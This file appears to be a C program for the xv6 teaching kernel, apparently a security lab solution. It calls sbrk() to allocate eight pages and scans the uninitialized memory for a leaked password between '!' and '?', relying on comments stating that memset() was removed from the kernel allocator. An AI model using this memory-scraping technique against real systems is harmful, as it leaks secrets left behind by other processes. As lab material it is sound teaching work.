#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// memset() is omitted in kernel/vm.c and kernel/kalloc.c, this creates a bug
// that can be exploited to leak data from kernel memory.
// a function that uses sbrk() to allocate memory may receive the leaked data

// this finds a password that starts with ! and ends with ? with the same memory page logic
int main(int argc, char *argv[]){
    int size = 8*4096;
    char *memory = sbrk(size);

    int start_pw = -1;

    for (int i = 0; i< size; i++){
        if (memory[i] == '!'){
            start_pw = i;
        } 
        else if (memory[i] == '?' && start_pw != -1){
            int end_pw = i;

            for (int k = start_pw; k <= end_pw; k++){
                printf("%c", memory[k]);
            }
            printf("\n");
            exit(0);
        }
    }
}


// int main(int argc, char *argv[])
// {
//   int size = 8 * 4096;

//   char *memory = sbrk(size);
//   if (memory == (char *)-1) // if sbrk fails, it will allocate (char *)-1
//   {
//     exit(1);
//   }
//   for (int i = 0; i < size; i++)
//   {
//     if (memory[i] == '!'){
//         int found = 0;
//         int j = 1;

//         while ((i+j) < size){
//             if (memory[i + j] == '?'){
//                 found = 1;
//                 break;
//             }
//             j++;
//         }

//         if (found == 1) // if inner loop didnt set found to 0, we found it
//         {
//             for (int k = i; k <= (i+j); k++){
//                 printf("%c", memory[k]);
//             }
//             printf("\n");
            
//             exit(0);
//         }
//     }
//   }
//   printf("pw not found\n");
//   return 0;
// }